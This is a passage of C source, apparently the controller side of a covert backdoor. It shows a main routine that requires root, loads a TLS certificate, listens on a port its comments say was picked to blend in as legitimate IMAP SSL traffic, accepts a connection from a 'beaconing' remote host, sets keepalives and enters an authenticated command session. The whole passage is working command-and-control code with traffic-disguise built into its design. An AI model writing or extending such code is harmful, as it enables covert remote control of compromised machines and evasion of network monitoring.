    int keepintvl = 15;                     // Wait 15 seconds in between each TCP keepalive probe
    int port = SERVE_PORT;                  // Server port number -- IMAP SSL to potentially blend as legitimate SSL traffic.
    int serverfd;                           // The serverfd that will be where we pass messages.
    int sockfd;                             // The main listener socket file descriptor
    SSL *ssl;                               // The SSL session pointer that is associated with a given session.
    SSL_CTX *ctx;                           // SSL connection context pointer
    char *auth = NULL;                      // The authentication phrase 
    char ipstr[INET6_ADDRSTRLEN];           // The ip address string for the peer -- is large enough to hold the max IPv6 length address.
    struct sockaddr_storage peer;           // The storage space that will reveal the peer address information.
    struct sockaddr_storage server;         // The sockaddr for the server that is beaconing
    socklen_t socklen = sizeof(server);     // The socklen for the server that is beaconing 
    socklen_t peerlen;                      // The peerlen message that is required for printing out peer info.

    // Ensure the user is running as root
    if(getuid() != 0) {
        fprintf(stderr, "[-] This program must be run as root/sudo user!");
        exit(FAIL);
    }

    // Parse the arguments passed
    if (parseargs(argc, argv, &auth, &port) != SUCCESS) {
      fprintf(stderr, "[-] Bailing early due to previous error.");
      exit(FAIL);
    }

    // Initialize the SSL library
    SSL_library_init();                                                             
    ctx = initCTX();                                                                
    loadcert(ctx, (char *)CERT, (char *)CERT);                                     

    // Setup the core listening socket
    if (setuplistner(port, &sockfd) < 0) {exit(FAIL);}
    
    // Catch a connection and start a session
    if ((serverfd = accept(sockfd, (struct sockaddr *)&server, &socklen)) < 0) {exit(FAIL);}

    // Set keepalives
    if (setsockopt(serverfd, SOL_SOCKET, SO_KEEPALIVE, &keepalive, sizeof(int)) < 0) {exit(FAIL);}
    if (setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPCNT, &keepcnt, sizeof(int)) < 0) {exit(FAIL);}
    if (setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPIDLE, &keepidle, sizeof(int)) < 0) {exit(FAIL);}
    if (setsockopt(serverfd, IPPROTO_TCP, TCP_KEEPINTVL, &keepintvl, sizeof(int)) < 0) {exit(FAIL);}

    // Print who we are speaking to.
    peerlen = sizeof(peer);
    getpeername(serverfd, (struct sockaddr*)&peer, &peerlen);
    if (peer.ss_family == AF_INET) {
      struct sockaddr_in *p = (struct sockaddr_in *)&peer;
      port = ntohs(p->sin_port);
      inet_ntop(AF_INET, &p->sin_addr, ipstr, sizeof(ipstr));
    } else { // AF_INET6
      struct sockaddr_in6 *p = (struct sockaddr_in6 *)&peer;
      port = ntohs(p->sin6_port);
      inet_ntop(AF_INET6, &p->sin6_addr, ipstr, sizeof(ipstr));
    } 
    printf("[+] Established connection with server at %s:%d.\n", ipstr, port);
    
    // Establish an SSL connection
    ssl = SSL_new(ctx);                                                            
    SSL_set_fd(ssl, serverfd);                                                   
    
    // Enter into our session
    entersession(ssl, auth);                                                        
    
    // Clean up the memory space and gracefully exit.
    close(serverfd);                                                                
    SSL_CTX_free(ctx);                                                              
}